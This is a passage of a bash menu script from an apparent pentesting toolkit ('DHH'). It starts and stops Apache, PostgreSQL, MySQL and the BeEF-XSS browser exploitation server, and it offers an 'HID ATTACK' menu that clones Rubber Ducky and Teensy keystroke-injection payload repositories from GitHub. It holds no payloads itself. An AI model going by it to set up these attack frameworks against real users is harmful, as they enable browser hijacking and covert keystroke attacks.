echo "[*]$RED:$BLUE START BEEF-XSS SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - start [beef-xss]  " -geometry 110x23 -e "service beef-xss start"
         echo $BLUE[*]$RED:$RED[start beef-xss]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done beef-xss server has been started " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear

}
function beef2 {
clear
echo
echo "[*]$RED:$BLUE STOPING BEEF-XSS SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - stoping [beef-xss]  " -geometry 110x23 -e "service beef-xss stop"
         echo $BLUE[*]$RED:$RED[stop beef-xss]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done beef-xss server has been stoped " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear

}

function beef3 {
clear
echo
echo "[*]$RED:$BLUE RESTARTING BEEF-XSS SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - restart [beef-xss]  " -geometry 110x23 -e "service beef-xss restart"
         echo $BLUE[*]$RED:$RED[restart beef-xss]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done beef-xss server has been restarted " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear

}

function my1 {
clear
echo
echo "[*]$RED:$BLUE STARTING MYSQL SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - start [mysql]  " -geometry 110x23 -e "service mysql start"
         echo $BLUE[*]$RED:$RED[start mysql]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done mysql server has been start " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear
}

function my2 {
clear
echo
echo "[*]$RED:$BLUE STOPING MYSQL SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - Stoping [mysql]  " -geometry 110x23 -e "service mysql stop"
         echo $BLUE[*]$RED:$RED[stop mysql]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done mysql server has been stop " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear
}
function my3 {
clear
echo
echo "[*]$RED:$BLUE RESTART MYSQL SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - Restart [mysql]  " -geometry 110x23 -e "service mysql restart"
         echo $BLUE[*]$RED:$RED[restart mysql]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done mysql server has been restarted " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear
}

function backtom {

clear
./DHH.sh


}

function homee {

cat << !
$GREEN
############# Apache ############$BLUE
 1 - Service Apache     > Start  
 2 - Service Apache     > Stop   
 3 - Service Apache     > Restart $GREEN
#################################

#########  Postgresql ###########  $BLUE
 4 - Service Postgresql > Start   
 5 - Service Postgresql > Stop   
 6 - Service Postgresql > Restart $GREEN 
#################################

############ Beef-Xss ########### $BLUE
 7 - Service Beef-Xss   > Start     
 8 - Service Beef-Xss   > Stop      
 9 - Service Beef-Xss   > Restart    $GREEN 
##################################

############  Mysql ############## $BLUE
10 - Service mysql      > Start      
11 - Service mysql      > Stop       
12 - Service mysql      > Restart    $GREEN 
################################## $BLUE
13 -$RED Exit                        
$GREEN

!

echo -n "ENTER YOUR CHOICE : $RED"
read coi
case $coi in
1)apache1
clear
homee ;;
2)apache2
clear
homee ;;
3)apache3 
clear
homee ;;
4)post1
clear
homee ;;
5)post2
clear
homee ;;
6)post3
clear
homee ;;
7)beef1
clear
homee ;;
8)beef2
clear
homee ;;
9)beef3
clear
homee ;;
10)my1
clear
homee ;;
11)my2
clear
homee ;;
12)my3
clear
homee ;;
13)clear && exit 2 ;;

* ) echo "$RED[x]$BLUE The error of your choice does not exist";sleep 2; clear;
 


esac



}

while true; do homee; done

else

if [ $word = 20 ];then
clear
echo
pteensy () {
	clear
echo
echo "" $GREEN
	echo -n " Do you want install pateensy  ?$RED[Y/N] : "
			read install
			if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
				echo "============== Install Pateensy for you ================="
sleep 4
echo "[*]working.........."
sleep 1

				git clone https://github.com/screetsec/Pateensy.git
echo  $GREEN"[*]Finishing......"
sleep 7
clear
else
if [[ $install = N || $install = n ]] ; then
clear
fi
fi

}

pducky () {
clear
echo
echo ""$GREEN
echo -n " Do you want to install pducky ?$RED [Y/N] : "
			read install
			if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========== install ducky for you =========== "
sleep 4
echo "[*]working.........."
sleep 1

				git clone https://github.com/toxic-ig/Quack.git
				echo  $GREEN"[*]Finishing......"
sleep 7
clear
else
if [[ $install = N || $install = n ]] ; then
clear
fi
fi

}

function HID {
cat << !
$GREEN
=======================================================================
$RED

██╗  ██╗██╗██████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██║  ██║██║██╔══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
███████║██║██║  ██║    ███████║   ██║      ██║   ███████║██║     █████╔╝ 
██╔══██║██║██║  ██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
██║  ██║██║██████╔╝    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝╚═╝╚═════╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
$GREEN                                                                        
=======================================================================$BLUE
	 		Let's Install HID ATTACK$GREEN   
=======================================================================$GREEN

1 $BLUE > Install Payload Ducky $GREEN
2 $BLUE > Install Payload Ptessnsy $GREEN

3 $BLUE >$RED EXIT $GREEN

!
echo -n  "Enter Coice :>$RED "
read co
case $co in
1)pducky
clear
HID ;;
2)pteensy
clear
HID ;;
3)clear && exit 0 ;;
* ) echo "$RED[x]$BLUE The error of your choice does not exist";sleep 2; clear;
 


esac



}

while true; do HID; done


else

if [[ $word = q || $word = Q ]];then
echo $GREEN
echo
echo "thanks for using "
sleep 2
echo $RED
echo "see you later"
sleep 2
echo
echo $BLUE
echo "goodbye :) "
sleep 2
clear
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
exit 
